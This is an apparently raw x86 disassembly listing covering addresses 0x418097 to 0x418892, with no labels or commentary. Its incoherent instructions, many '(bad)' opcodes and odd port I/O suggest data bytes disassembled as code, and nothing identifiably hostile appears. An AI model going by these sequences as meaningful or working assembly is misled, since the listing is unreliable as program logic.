  418097:	cmp    esp,DWORD PTR fs:[ebx]
  41809a:	and    edx,DWORD PTR [edi]
  41809c:	and    esp,DWORD PTR [eax]
  41809e:	and    BYTE PTR ds:0x1520100f,dl
  4180a4:	sub    al,0x51
  4180a6:	pop    edi
  4180a7:	je     0x418029
  4180a9:	(bad)  
  4180aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180ab:	(bad)  
  4180ac:	call   0xf7387ead
  4180b1:	div    ah
  4180b3:	mul    dh
  4180b5:	out    0xe7,eax
  4180b7:	in     al,dx
  4180b8:	mul    al
  4180ba:	loopne 0x418099
  4180bc:	(bad)  
  4180be:	cld    
  4180bf:	stos   BYTE PTR es:[edi],al
  4180c0:	mov    ecx,0xfbd8aaad
  4180c5:	out    dx,eax
  4180c6:	in     eax,0xd9
  4180c8:	in     eax,0xeb
  4180ca:	in     al,0xe7
  4180cc:	hlt    
  4180cd:	in     eax,0xf0
  4180cf:	bnd jmp 0xec2267c1
  4180d5:	cld    
  4180d6:	enter  0x7fa2,0x6f
  4180da:	cmp    esi,DWORD PTR ds:[ebx+eiz*1]
  4180de:	ds push eax
  4180e0:	ds xor al,0x2c
  4180e3:	push   eax
  4180e4:	push   eax
  4180e5:	sub    al,0x50
  4180e7:	push   esp
  4180e8:	push   ecx
  4180e9:	push   esp
  4180ea:	jnp    0x41808d
  4180ec:	(bad)
  4180ef:	out    dx,al
  4180f0:	(bad)  
  4180f2:	fnsave [esi-0x1b19194b]
  4180f8:	(bad)  
  4180fa:	in     eax,0xf8
  4180fc:	loop   0x4180a8
  4180fe:	mov    ds:0xc7c7fcd0,al
  418103:	div    ecx
  418105:	out    0xe4,eax
  418107:	in     al,dx
  418108:	cmc    
  418109:	out    dx,eax
  41810a:	in     eax,0xe5
  41810c:	in     eax,0xeb
  41810e:	out    dx,eax
  41810f:	fucom  st(0)
  418111:	stc    
  418112:	jmp    0x5f74:0xaad8fcfa
  418119:	xor    al,0x20
  41811b:	adc    BYTE PTR ds:0xf101515,dl
  418121:	movhps QWORD PTR [eax],xmm4
  418124:	cmp    esp,DWORD PTR [eax-0x5f]
  418127:	mov    bh,0xb7
  418129:	repz clc 
  41812b:	sti    
  41812c:	sti    
  41812d:	cli    
  41812e:	hlt    
  41812f:	jmp    0xe61e6925
  418134:	(bad)  
  418136:	hlt    
  418137:	in     al,dx
  418138:	in     al,dx
  418139:	out    0xeb,al
  41813b:	(bad)  
  41813d:	cld    
  41813e:	call   0xa2d923fb
  418143:	xlat   BYTE PTR ds:[ebx]
  418144:	div    ah
  418146:	hlt    
  418147:	in     eax,0xe5
  418149:	loopne 0x418131
  41814b:	loopne 0x418141
  41814d:	out    0xf4,eax
  41814f:	repnz jmp 0xc0fc:0xe9dbeceb
  418157:	mov    eax,ds:0x3b3b607b
  41815c:	xor    al,0x34
  41815e:	and    esp,DWORD PTR [eax]
  418160:	ss ss ss xor al,0x23
  418165:	and    BYTE PTR [eax+edx*2],dh
  418168:	cmp    ebx,DWORD PTR [edi+0x74]
  41816b:	xchg   edi,eax
  41816c:	shr    dh,0xf0
  41816f:	jmp    0xde1f3228
  418174:	fsubr  st(6),st
  418176:	out    0xb5,al
  418178:	mov    bh,0xdd
  41817a:	out    dx,eax
  41817b:	rep stos BYTE PTR es:[edi],al
  41817d:	xchg   edi,eax
  41817e:	(bad)  
  41817f:	mov    eax,ds:0xf3c0f4d0
  418184:	stc    
  418185:	out    0xe5,al
  418187:	in     eax,0xef
  418189:	out    0xe4,eax
  41818b:	out    0xe5,eax
  41818d:	in     eax,0xef
  41818f:	mov    dh,0xb3
  418191:	rcl    ecx,1
  418193:	loope  0x41818f
  418195:	sti    
  418196:	ror    DWORD PTR [edi+0x20153e6f],0x20
  41819d:	adc    BYTE PTR [edi],cl
  41819f:	adc    BYTE PTR [edi],cl
  4181a1:	adc    BYTE PTR [eax],ah
  4181a3:	sub    al,0x51
  4181a5:	je     0x41816b
  4181a7:	cld    
  4181a8:	cli    
  4181a9:	cld    
  4181aa:	cli    
  4181ab:	repnz (bad) 
  4181ae:	(bad)  
  4181b0:	hlt    
  4181b1:	jmp    0x41818e
  4181b3:	mov    dh,0xdd
  4181b5:	fcomip st,st(4)
  4181b7:	imul   bl
  4181b9:	jmp    0xfd2e61a9
  4181be:	mov    eax,0xa18f94a2
  4181c3:	call   0xe52766bc
  4181c8:	(bad)  [eax-0xb1a1b23]
  4181ce:	loop   0x4181c4
  4181d0:	jmp    0x4181af
  4181d2:	mul    al
  4181d4:	(bad)  
  4181d6:	mov    eax,0x50517497
  4181db:	cmp    esi,DWORD PTR [ebx+edi*1]
  4181de:	xor    al,0x23
  4181e0:	ss sub al,0x2c
  4181e3:	cmp    esi,DWORD PTR ds:[ebx+eiz*1]
  4181e7:	ss xor al,0x50
  4181ea:	pop    edi
  4181eb:	jg     0x418197
  4181ed:	out    dx,al
  4181ee:	sti    
  4181ef:	out    dx,eax
  4181f0:	out    0xe7,eax
  4181f2:	shl    BYTE PTR [esi-0x4a1b1f4a],cl
  4181f8:	mov    ch,0xdb
  4181fa:	fcmovu st,st(0)
  4181fc:	mov    ds:0x8d7b7b8d,al
  418201:	sahf   
  418202:	mov    esp,0xe4effbd8
  418207:	out    0xe4,eax
  418209:	in     eax,0xe5
  41820b:	fsubr  st(4),st
  41820d:	jmp    0x4181fa
  41820f:	in     al,0xe0
  418211:	mov    ah,0xd2
  418213:	jmp    0x517b:0xa2e8fcde
  41821a:	sub    DWORD PTR [ebx],esp
  41821c:	adc    eax,0xf15100f
  418221:	adc    BYTE PTR [ebx],ah
  418223:	ss pop edi
  418225:	jg     0x4181ed
  418227:	cld    
  418228:	cli    
  418229:	cmc    
  41822a:	cmc    
  41822b:	(bad)  
  41822d:	lock cli 
  41822f:	fcmovu st,st(1)
  418231:	fsubr  st(0),st
  418233:	frstpm(287 only) 
  418235:	fstp   st(4)
  418237:	hlt    
  418238:	loopne 0x418219
  41823a:	mov    ah,0x9c
  41823c:	jmp    0x94d93b35
  418241:	lea    edx,[edi-0x28480b18]
  418247:	in     al,0xb5
  418249:	mov    ah,0xe4
  41824b:	in     eax,0xe0
  41824d:	hlt    
  41824e:	in     eax,0xe6
  418250:	out    dx,al
  418251:	fsubr  st(5),st
  418253:	hlt    
  418254:	jmp    0x64d12554
  418259:	ds ss sub al,0x34
  41825d:	ss cmp edi,DWORD PTR ds:[ebx]
  418261:	sub    al,0x23
  418263:	cmp    ebp,DWORD PTR [ecx]
  418265:	xor    al,0x36
  418267:	cmp    esi,DWORD PTR [esi+esi*1]
  41826a:	bound  esi,QWORD PTR [esp+edx*4-0xe]
  41826e:	cld    
  41826f:	loop   0x418228
  418271:	mov    dh,0xdc
  418273:	mov    ch,0x9c
  418275:	mov    dh,0xdd
  418277:	mov    ch,0x9f
  418279:	(bad)  [esi+0x6f7f97d0]
  41827f:	pop    edi
  418280:	outs   dx,DWORD PTR ds:[esi]
  418281:	jg     0x41821a
  418283:	mov    ebx,0xe7e4f9e5
  418288:	lock in al,0xdc
  41828b:	in     al,0xde
  41828d:	out    dx,al
  41828e:	shl    al,cl
  418290:	fnsave [ebx-0x3301525]
  418296:	cld    
  418297:	xchg   esp,eax
  418298:	(bad)  
  418299:	pusha  
  41829a:	push   ecx
  41829b:	sub    DWORD PTR ds:0xf171510,edx
  4182a1:	movhps QWORD PTR [eax+eiz*2],xmm6
  4182a5:	(bad)  
  4182a6:	ret    
  4182a7:	cld    
  4182a8:	in     al,dx
  4182a9:	jmp    0x418294
  4182ab:	in     al,dx
  4182ac:	fucom  st(3)
  4182ae:	cld    
  4182af:	in     al,0xe7
  4182b1:	mov    dh,0xb2
  4182b3:	mov    dl,0xeb
  4182b5:	jmp    0xde226f95
  4182ba:	fnsave [eax+esi*8-0x70725d3a]
  4182c1:	jg     0x418257
  4182c3:	call   0xd81e21ad
  4182c8:	(bad)  
  4182ca:	mov    bh,0xb5
  4182cc:	fcmovnbe st,st(1)
  4182ce:	in     al,0xe0
  4182d0:	out    dx,al
  4182d1:	out    0xdd,al
  4182d3:	repz lock repnz mov eax,ds:0x2c50628d
  4182db:	sub    DWORD PTR [ecx+ebp*1],ebp
  4182de:	cmp    edi,DWORD PTR [esi]
  4182e0:	ss and edi,DWORD PTR ss:[esi]
  4182e4:	xor    al,0x20
  4182e6:	and    esi,DWORD PTR [esi+esi*1]
  4182e9:	sub    al,0x3e
  4182eb:	je     0x41827c
  4182ed:	aad    0xf8
  4182ef:	out    dx,eax
  4182f0:	mov    bh,0xb2
  4182f2:	mov    dh,0xb5
  4182f4:	mov    al,ds:0xb2b59f9f
  4182f9:	mov    ch,0xdc
  4182fb:	loop   0x418294
  4182fd:	outs   dx,DWORD PTR ds:[esi]
  4182fe:	push   edi
  4182ff:	ds push ecx
  418301:	pop    edi
  418302:	jnp    0x418298
  418304:	stos   BYTE PTR es:[edi],al
  418305:	repz in al,dx
  418307:	in     al,dx
  418308:	out    dx,al
  418309:	fnsetpm(287 only) 
  41830b:	in     al,0xe4
  41830d:	jmp    0x4182c3
  41830f:	(bad)  [esi-0x51155f4d]
  418315:	hlt    
  418316:	sti    
  418317:	retf   0x7097
  41831a:	push   esp
  41831b:	and    edx,DWORD PTR [edi]
  41831d:	unpckhps xmm1,XMMWORD PTR [edi]
  418320:	invd   
  418322:	adc    eax,0xc28d5f29
  418327:	cld    
  418328:	fsubr  st(7),st
  41832a:	in     al,dx
  41832b:	in     al,dx
  41832c:	fucomip st,st(5)
  41832e:	sti    
  41832f:	out    0xe4,al
  418331:	fcmovnu st,st(3)
  418333:	mov    ch,0xb5
  418335:	fucomip st,st(1)
  418337:	jmp    0x418318
  418339:	fcmovnu st,st(3)
  41833b:	in     al,dx
  41833c:	stc    
  41833d:	mov    eax,0x74707f8f
  418342:	nop
  418343:	out    dx,eax
  418344:	jmp    0x418330
  418346:	fsubr  st(7),st
  418348:	in     al,0xef
  41834a:	in     al,dx
  41834b:	in     al,dx
  41834c:	(bad)  [ecx-0x19121825]
  418352:	in     al,0xe4
  418354:	stc    
  418355:	loop   0x4182f8
  418357:	jg     0x4183b8
  418359:	push   ecx
  41835a:	and    ebp,DWORD PTR [esp+esi*1]
  41835d:	sub    DWORD PTR [ecx],ebp
  41835f:	and    edi,DWORD PTR [ebx]
  418361:	sub    DWORD PTR ds:[esi],edi
  418364:	sub    DWORD PTR [ecx+ebp*1],esi
  418367:	xor    al,0x29
  418369:	sub    al,0x3b
  41836b:	pusha  
  41836c:	jg     0x418318
  41836e:	leave  
  41836f:	out    dx,eax
  418370:	jmp    0x418329
  418372:	fdiv   QWORD PTR [edx-0x7663604b]
  418378:	mov    al,ds:0x92faefb6
  41837d:	fs push eax
  41837f:	cmp    edi,DWORD PTR ds:[esi]
  418382:	pusha  
  418383:	je     0x418314
  418385:	mov    ds:0xd2dce4de,eax
  41838a:	in     al,0xe4
  41838c:	in     eax,0xe4
  41838e:	loopne 0x418362
  418390:	mov    ah,0xa0
  418392:	mov    ch,0xe3
  418394:	mov    ah,0xcf
  418396:	sti    
  418397:	out    dx,eax
  418398:	mov    eax,0x1736607f
  41839d:	movups xmm2,XMMWORD PTR ds:0x2c150808
  4183a4:	push   edi
  4183a5:	jg     0x418360
  4183a7:	stc    
  4183a8:	fsubr  st(5),st
  4183aa:	in     eax,0xb6
  4183ac:	fucomi st,st(6)
  4183ae:	cld    
  4183af:	jmp    0x41838b
  4183b1:	mov    ah,0xdb
  4183b3:	mov    al,0xb0
  4183b5:	fcmovnu st,st(5)
  4183b7:	fucomp st(1)
  4183b9:	out    0xdc,al
  4183bb:	repnz shl BYTE PTR [ecx+0x5f54627b],cl
  4183c2:	adc    eax,0xc6c4c6c4
  4183c8:	(bad)  
  4183c9:	mov    edx,0xb1d1fbde
  4183ce:	fcmovu st,st(4)
  4183d0:	out    0xe6,eax
  4183d2:	lds    edi,FWORD PTR [edx+0x7b94b9cb]
  4183d8:	push   edi
  4183d9:	ds xor al,0x29
  4183dc:	sub    DWORD PTR [ebx],esp
  4183de:	xor    al,0x34
  4183e0:	ss xor al,0x2c
  4183e3:	ds xor al,0x3b
  4183e6:	sub    al,0x34
  4183e8:	xor    al,0x36
  4183ea:	ds pop edi
  4183ec:	jnp    0x418385
  4183ee:	rcl    bl,0xf2
  4183f1:	out    0xb6,eax
  4183f3:	mov    dl,0xb2
  4183f5:	xchg   BYTE PTR [esi-0xc115f61],al
  4183fb:	(bad)  
  4183fc:	lea    esp,[esp+esi*1+0x34]
  418400:	sub    al,0x23
  418402:	ds push ecx
  418404:	jo     0x418393
  418406:	lods   al,BYTE PTR ds:[esi]
  418407:	in     eax,dx
  418408:	(bad)  
  41840a:	rcr    ah,cl
  41840c:	fsubr  st(4),st
  41840e:	loopne 0x4183c3
  418410:	mov    ch,0x9c
  418412:	mov    ah,0xdd
  418414:	sar    DWORD PTR [edi-0x6b34031e],1
  41841a:	outs   dx,DWORD PTR ds:[esi]
  41841b:	and    edx,DWORD PTR ds:[edi]
  41841e:	adc    eax,0xf100810
  418423:	sub    DWORD PTR [edi+edi*2-0x48],edx
  418427:	hlt    
  418428:	mov    dh,0xe4
  41842a:	in     al,0xdc
  41842c:	fcmovnu st,st(5)
  41842e:	out    dx,al
  41842f:	fidiv  DWORD PTR [esp+esi*4-0x494a7b4a]
  418436:	(bad)  
  418438:	fucom  st(6)
  41843a:	jmp    0x64d1322f
  41843f:	push   ecx
  418440:	ds push ecx
  418442:	pusha  
  418443:	jnp    0x4183d2
  418445:	xchg   edi,eax
  418446:	mov    ds:0xcac7bcb8,al
  41844b:	cld    
  41844c:	fst    st(1)
  41844e:	loopne 0x41842c
  418450:	ror    bh,cl
  418452:	mov    esp,0x8fc3bbb8
  418457:	jnp    0x4184b8
  418459:	push   eax
  41845a:	ds xor al,0x2c
  41845d:	ss sub al,0x36
  418460:	cmp    edi,DWORD PTR [esi]
  418462:	ds xor al,0x3b
  418465:	ds sub al,0x17
  418468:	xor    al,0x3b
  41846a:	ds push esp
  41846c:	je     0x418402
  41846e:	mov    eax,0xe4f0d3c7
  418473:	popf   
  418474:	mov    al,0x76
  418476:	imul   eax,DWORD PTR [ebp-0x5e301f4b],0x29345f7b
  418480:	sub    DWORD PTR [ebx],esp
  418482:	cmp    esi,DWORD PTR [esi]
  418484:	push   eax
  418485:	jo     0x418416
  418487:	lods   al,BYTE PTR ds:[esi]
  418488:	fnsave [ebp-0x101b4c3a]
  41848e:	mov    dh,0xb0
  418490:	mov    bl,0xb4
  418492:	mov    ah,0xa0
  418494:	mov    cl,0xae
  418496:	(bad)  
  418499:	mov    ds:0x152c507b,al
  41849e:	adc    eax,0xf10100f
  4184a3:	and    BYTE PTR [ecx+0x7b],dl
  4184a6:	(bad)  
  4184a7:	cmc    
  4184a8:	in     al,0xe5
  4184aa:	in     al,0xb2
  4184ac:	mov    dh,0xd1
  4184ae:	mov    ah,0x91
  4184b0:	fstp   st(3)
  4184b2:	mov    dh,0xb4
  4184b4:	mov    bh,0xb6
  4184b6:	out    0xdb,al
  4184b8:	fcmovnu st,st(7)
  4184ba:	out    dx,al
  4184bb:	aam    0xa1
  4184bd:	jnp    0x41851e
  4184bf:	ds ds ds push ecx
  4184c3:	pop    edi
  4184c4:	fs jnp 0x418454
  4184c7:	mov    eax,ds:0xfccec7b8
  4184cc:	fcmovnu st,st(7)
  4184ce:	clc    
  4184cf:	mov    bh,0xbf
  4184d1:	mov    esp,0xf8f8bcb8
  4184d6:	mov    ds:0x3651647f,al
  4184db:	xor    al,0x29
  4184dd:	and    BYTE PTR [ebx],ah
  4184df:	and    esi,DWORD PTR [ecx+ebp*1]
  4184e2:	and    ebp,DWORD PTR [ecx]
  4184e4:	and    ebp,DWORD PTR [esp+ebp*1]
  4184e7:	and    esi,DWORD PTR [esp+esi*1]
  4184ea:	sub    al,0x54
  4184ec:	fs xchg esp,eax
  4184ee:	stos   BYTE PTR es:[edi],al
  4184ef:	mov    esp,0x49eed6c9
  4184f4:	xchg   DWORD PTR [ebx+0x3f],ebp
  4184f7:	jbe    0x4184ae
  4184f9:	loop   0x4184b3
  4184fb:	xchg   edi,eax
  4184fc:	je     0x41855d
  4184fe:	sub    DWORD PTR [edi+edx*1],ebp
  418501:	sub    DWORD PTR [ebx+eiz*1],ebp
  418504:	cmp    edx,DWORD PTR [eax+0x64]
  418507:	lea    edi,[edi-0x1d394a20]
  41850d:	shl    BYTE PTR [ecx-0x4e5f4f50],cl
  418513:	mov    al,0xae
  418515:	lds    ebp,FWORD PTR [edx+ebp*8+0x5f8dbcfb]
  41851c:	xor    al,0x10
  41851e:	adc    eax,0xf080815
  418523:	and    BYTE PTR [eax+0x74],dl
  418526:	mov    ds:0xb4e4e5f6,al
  41852b:	fstp   st(5)
  41852d:	jmp    0xb126390c
  418532:	sahf   
  418533:	popf   
  418534:	mov    ch,0xb7
  418536:	jecxz  0x4184f9
  418538:	xchg   edi,eax
  418539:	lds    edx,FWORD PTR [esp+edx*4+0x2c50607b]
  418540:	and    esp,DWORD PTR [eax]
  418542:	ss ss ds push edi
  418546:	pusha  
  418547:	jnp    0x4184dd
  418549:	rcl    ch,0xfa
  41854c:	sar    eax,1
  41854e:	fdivr  DWORD PTR [ebx-0x8434348]
  418554:	cld    
  418555:	repnz xchg edi,eax
  418557:	(bad)  
  418558:	outs   dx,DWORD PTR ds:[esi]
  418559:	push   eax
  41855a:	xor    al,0x29
  41855c:	sub    DWORD PTR [ebx],esp
  41855e:	sub    DWORD PTR [ebx],esp
  418560:	sub    DWORD PTR [eax],esp
  418562:	pop    ss
  418563:	and    ebp,DWORD PTR [esp+ebp*1]
  418566:	sub    DWORD PTR [ecx],ebp
  418568:	sub    al,0x23
  41856a:	cmp    edx,DWORD PTR [edi+0x70]
  41856d:	mov    esi,0xc9c7c1c9
  418572:	aad    0x4a
  418574:	dec    ecx
  418575:	dec    ebp
  418576:	cmp    BYTE PTR [esi-0x4e],dh
  418579:	out    0xc7,al
  41857b:	xchg   edi,eax
  41857c:	je     0x4185cf
  41857e:	sub    al,0x23
  418580:	and    BYTE PTR [ebx],ah
  418582:	and    esp,DWORD PTR [ebx]
  418584:	sub    DWORD PTR [eax+edx*2],esi
  418587:	je     0x418520
  418589:	rcl    dl,1
  41858b:	loop   0x418570
  41858d:	mov    al,0xb1
  41858f:	mov    cl,0x9e
  418591:	mov    al,ds:0xcfc5aeb0
  418596:	mov    ds:0x94d4f2e1,eax
  41859b:	outs   dx,DWORD PTR ds:[esi]
  41859c:	and    edx,DWORD PTR ds:[eax]
  41859f:	adc    BYTE PTR [eax],cl
  4185a1:	invd   
  4185a3:	sub    DWORD PTR [ebx+edi*2-0x5e],edx
  4185a7:	hlt    
  4185a8:	in     eax,0xdd
  4185aa:	fsubr  st(0),st
  4185ac:	jmp    0xb6a0:0xb2b7b5f0
  4185b3:	xchg   ebx,eax
  4185b4:	xchg   ebx,eax
  4185b5:	jecxz  0x418599
  4185b7:	mov    esp,0x7b979490
  4185bc:	pusha  
  4185bd:	sub    DWORD PTR ds:[ecx],ebp
  4185c0:	sub    al,0x20
  4185c2:	adc    BYTE PTR [ecx],ch
  4185c4:	xor    al,0x2c
  4185c6:	ds pop edi
  4185c8:	lea    edi,[eax-0x3007072d]
  4185ce:	mov    eax,0xfcc4bcbc
  4185d3:	neg    bl
  4185d5:	jmp    0x3434:0x57648f74
  4185dc:	sub    DWORD PTR [ebx],esp
  4185de:	sub    al,0x29
  4185e0:	and    ebp,DWORD PTR [ebx+eiz*1]
  4185e3:	and    BYTE PTR [eax],ah
  4185e5:	and    BYTE PTR [eax],ah
  4185e7:	and    esp,DWORD PTR [ebx]
  4185e9:	sub    al,0x36
  4185eb:	pop    edi
  4185ec:	jnp    0x4185b1
  4185ee:	leave  
  4185ef:	retf   0xcaca
  4185f2:	ret    0x4787
  4185f5:	ins    DWORD PTR es:[edi],dx
  4185f6:	dec    edx
  4185f7:	imul   esp,DWORD PTR [eax+0x7ba1c8dd],0x20292c51
  418601:	pop    ss
  418602:	and    ebp,DWORD PTR [ecx]
  418604:	and    ebp,DWORD PTR [ecx]
  418606:	ss push esp
  418608:	jnp    0x4185ab
  41860a:	(bad)  
  41860b:	jmp    0x9db1:0xb1b1b0d2
  418612:	jbe    0x4185a7
  418614:	(bad)
  418617:	(bad)
  41861a:	mov    ds:0x1523547b,al
  41861f:	invd   
  418621:	(bad)  
  418622:	mov    db2,eax
  418625:	je     0x4185ca
  418627:	in     eax,0xb7
  418629:	in     al,0xe5
  41862b:	fucomip st,st(2)
  41862d:	lock xlat BYTE PTR ds:[ebx]
  41862f:	shl    BYTE PTR [ebp-0x634a2f76],cl
  418635:	aad    0xe3
  418637:	shl    BYTE PTR [edx+0x3e607ba1],0x2c
  41863e:	and    edx,DWORD PTR ds:0x20292917
  418644:	and    BYTE PTR [eax],ah
  418646:	xor    al,0x51
  418648:	fs xchg esp,eax
  41864a:	mov    esi,0xb8bcd2fa
  41864f:	mov    ds:0x8feffbc6,al
  418654:	jg     0x41863f
  418656:	xchg   edi,eax
  418657:	xchg   edi,eax
  418658:	je     0x4186b1
  41865a:	xor    al,0x29
  41865c:	sub    DWORD PTR [ebx],esp
  41865e:	and    esp,DWORD PTR [eax]
  418660:	sub    al,0x23
  418662:	and    BYTE PTR [ecx],ch
  418664:	sub    DWORD PTR [ebx+eiz*1],ebp
  418667:	and    ebp,DWORD PTR [ecx]
  418669:	cmp    esp,DWORD PTR ss:[edx+0x7f]
  41866d:	ret    
  41866e:	lds    edi,FWORD PTR [ebp+0x4caccecb]
  418674:	xchg   DWORD PTR [edx+0x6b],ecx
  418677:	pushf  
  418678:	mov    al,ds:0x7fbdcedc
  41867d:	push   edi
  41867e:	and    BYTE PTR ss:[eax],ah
  418681:	pop    ss
  418682:	adc    eax,0x2c202020
  418687:	cmp    esp,DWORD PTR [edx-0x71]
  41868a:	shl    dl,1
  41868c:	lds    esi,FWORD PTR [ecx-0x7b4e4c4d]
  418692:	test   BYTE PTR [ecx-0x403a3a3b],dl
  418698:	out    dx,al
  418699:	repnz mov esp,0x15205f7f
  41869f:	adc    eax,0x20080f08
  4186a4:	ds je  0x418648
  4186a7:	rcl    al,1
  4186a9:	jecxz  0x41868b
  4186ab:	mov    bl,0xb4
  4186ad:	jecxz  0x41868b
  4186af:	in     al,0xb7
  4186b1:	mov    ch,0xd1
  4186b3:	scas   al,BYTE PTR es:[edi]
  4186b4:	imul   ebp,edi,0x7fa2c7ea
  4186ba:	pop    edi
  4186bb:	and    esp,DWORD PTR ds:[eax]
  4186be:	and    BYTE PTR [eax],ah
  4186c0:	sub    DWORD PTR [eax],edx
  4186c2:	and    BYTE PTR [edi],dl
  4186c4:	and    BYTE PTR ds:0x74573617,dl
  4186ca:	lea    ebp,[esi-0x4a5d4747]
  4186d0:	stc    
  4186d1:	loop   0x418697
  4186d3:	mov    bl,0xae
  4186d5:	fcmovnb st,st(0)
  4186d7:	mov    eax,ds:0x203b607b
  4186dc:	and    BYTE PTR ds:0x17291715,dl
  4186e2:	sub    DWORD PTR [esp+ebp*1],ebp
  4186e5:	and    ebp,DWORD PTR [ecx]
  4186e7:	sub    DWORD PTR [ebx],esp
  4186e9:	and    edi,DWORD PTR [esi]
  4186eb:	pusha  
  4186ec:	pop    edi
  4186ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186ef:	add    BYTE PTR [esi-0x62],ah
  4186f2:	xchg   ebx,eax
  4186f3:	jbe    0x41867e
  4186f5:	ins    DWORD PTR es:[edi],dx
  4186f6:	pop    esi
  4186f7:	lahf   
  4186f8:	mov    al,0xdc
  4186fa:	int3   
  4186fb:	(bad)  
  4186fc:	jg     0x418760
  4186fe:	and    BYTE PTR ss:[edi],dl
  418701:	and    edx,DWORD PTR [edi]
  418703:	adc    eax,0x29201515
  418708:	push   ecx
  418709:	jnp    0x4186b0
  41870b:	jecxz  0x4186e2
  41870d:	into   
  41870e:	mov    cl,0x9d
  418710:	xchg   ebx,eax
  418711:	test   BYTE PTR [esi+esi*2-0x40513a62],al
  418718:	loop   0x41870c
  41871a:	ret    
  41871b:	lea    esp,[edx+0x2c]
  41871e:	pop    ss
  41871f:	or     BYTE PTR [eax],cl
  418721:	(bad)  
  418722:	movhps QWORD PTR [esi],xmm7
  418725:	jo     0x4186c8
  418727:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418728:	fsubr  st(3),st
  41872a:	into   
  41872b:	mov    al,ds:0xcce2e2c5
  418730:	mov    dl,0xb7
  418732:	rcl    BYTE PTR [ebx-0x47290f95],1
  418738:	xchg   esp,eax
  418739:	jo     0x418779
  41873b:	sub    al,0x20
  41873d:	adc    eax,0x15152010
  418742:	sub    DWORD PTR [ebx],esp
  418744:	adc    eax,0x3e293423
  418749:	pop    edi
  41874a:	jg     0x4186e0
  41874c:	mov    eax,0xd0edd8b9
  418751:	xchg   ecx,eax
  418752:	mov    al,0xa0
  418754:	mov    bl,0xd0
  418756:	ret    
  418757:	stos   BYTE PTR es:[edi],al
  418758:	lea    esp,[eax+edx*2+0x34]
  41875c:	and    BYTE PTR [eax],ah
  41875e:	and    BYTE PTR [edi],dl
  418760:	sub    DWORD PTR [eax],esp
  418762:	pop    ss
  418763:	and    esp,DWORD PTR [ebx]
  418765:	sub    DWORD PTR [ebx],esp
  418767:	and    esi,DWORD PTR [ecx+ebp*1]
  41876a:	push   eax
  41876b:	pusha  
  41876c:	(bad)  
  41876d:	rcr    DWORD PTR [ecx+0x5b87a727],0x58
  418774:	mov    al,ds:0xa0878585
  418779:	mov    dl,0xcb
  41877b:	rcl    DWORD PTR [eax+esi*2+0x17102c3e],0x15
  418783:	adc    BYTE PTR [eax],ah
  418785:	adc    eax,0x643e2320
  41878a:	xchg   esp,eax
  41878b:	rcl    esi,1
  41878d:	loop   0x418736
  41878f:	mov    cl,0x9e
  418791:	mov    al,0x76
  418793:	jbe    0x41880b
  418795:	scas   al,BYTE PTR es:[edi]
  418796:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418797:	lods   al,BYTE PTR ds:[esi]
  418798:	(bad)
  41879b:	xchg   esp,eax
  41879c:	fs ss pop ss
  41879f:	invd   
  4187a1:	or     BYTE PTR [eax],dl
  4187a3:	and    BYTE PTR [ecx+0x70],dl
  4187a6:	mov    eax,ds:0xcfd5dcb0
  4187ab:	lahf   
  4187ac:	shl    BYTE PTR [ebp-0x4d5f121e],1
  4187b2:	shr    BYTE PTR [esi-0x47351576],1
  4187b8:	jg     0x418819
  4187ba:	ss sub al,0x29
  4187bd:	pop    ss
  4187be:	and    edx,DWORD PTR [edi]
  4187c0:	pop    ss
  4187c1:	adc    eax,0x17151720
  4187c6:	and    ebp,DWORD PTR [ebx+edi*1]
  4187c9:	bound  edi,QWORD PTR [edi-0x5f]
  4187cc:	mov    ecx,0x67a0f2de
  4187d1:	test   DWORD PTR [esi-0x2c4c794d],ebx
  4187d7:	mov    eax,0x515f7b94
  4187dc:	sub    DWORD PTR ss:[ecx],ebp
  4187df:	pop    ss
  4187e0:	and    edx,DWORD PTR [eax]
  4187e2:	and    edx,DWORD PTR [edi]
  4187e4:	sub    al,0x23
  4187e6:	and    edx,DWORD PTR [edi]
  4187e8:	pop    ss
  4187e9:	sub    al,0x34
  4187eb:	pop    edi
  4187ec:	(bad)  
  4187ed:	rcr    DWORD PTR [ecx-0x60938b8a],0x5b
  4187f4:	push   ebx
  4187f5:	xchg   al,dl
  4187f7:	mov    al,ds:0xcaccb586
  4187fc:	xchg   edi,eax
  4187fd:	je     0x41884f
  4187ff:	and    esp,DWORD PTR ss:[ebx]
  418802:	and    BYTE PTR [eax],dl
  418804:	adc    eax,0x34201515
  418809:	pop    edi
  41880a:	lea    ebp,[esi+edx*8-0x61513a22]
  418811:	sahf   
  418812:	popf   
  418813:	xchg   ebx,eax
  418814:	jbe    0x4187a9
  418816:	xchg   ebx,eax
  418817:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418818:	(bad)
  41881b:	mov    eax,ds:0xf203e70
  418820:	or     BYTE PTR [eax],dl
  418822:	adc    BYTE PTR [edi],dl
  418824:	cmp    esi,DWORD PTR [eax-0x69]
  418827:	mov    al,ds:0xb1d0d4cf
  41882c:	loop   0x41880c
  41882e:	mov    dl,0xe2
  418830:	loop   0x4187d1
  418832:	mov    bl,0xb0
  418834:	mov    ch,0xe0
  418836:	shr    DWORD PTR [edx+0x2323547b],0x15
  41883d:	adc    eax,0x15101717
  418842:	pop    ss
  418843:	adc    BYTE PTR [edi],dl
  418845:	pop    ss
  418846:	and    BYTE PTR [eax+edx*2],ch
  418849:	jo     0x4187df
  41884b:	(bad)  
  41884c:	(bad)  
  41884d:	loop   0x4187ec
  41884f:	mov    BYTE PTR [ebp-0x624e797b],bl
  418855:	xchg   dh,dl
  418857:	retf   0x7faa
  41885a:	bound  edi,QWORD PTR [ebx]
  41885c:	and    ebp,DWORD PTR [ecx]
  41885e:	xor    al,0x2c
  418860:	xor    al,0x29
  418862:	and    BYTE PTR [ecx],ch
  418864:	sub    DWORD PTR ds:0x29172915,edx
  41886a:	sub    al,0x54
  41886c:	jnp    0x41882b
  41886e:	ret    
  41886f:	xchg   ebx,eax
  418870:	popf   
  418871:	xchg   BYTE PTR [eax-0x60c3a563],ah
  418877:	lahf   
  418878:	lahf   
  418879:	mov    dl,0xa0
  41887b:	enter  0x7497,0x51
  41887f:	sub    DWORD PTR ds:0x20202310,edx
  418885:	pop    ss
  418886:	and    BYTE PTR [ebx],ah
  418888:	sub    DWORD PTR [ecx+0x74],edx
  41888b:	cdq    
  41888c:	aad    0xa3
  41888e:	scas   al,BYTE PTR es:[edi]
  41888f:	(bad)
  418892:	jbe    0x4188fa
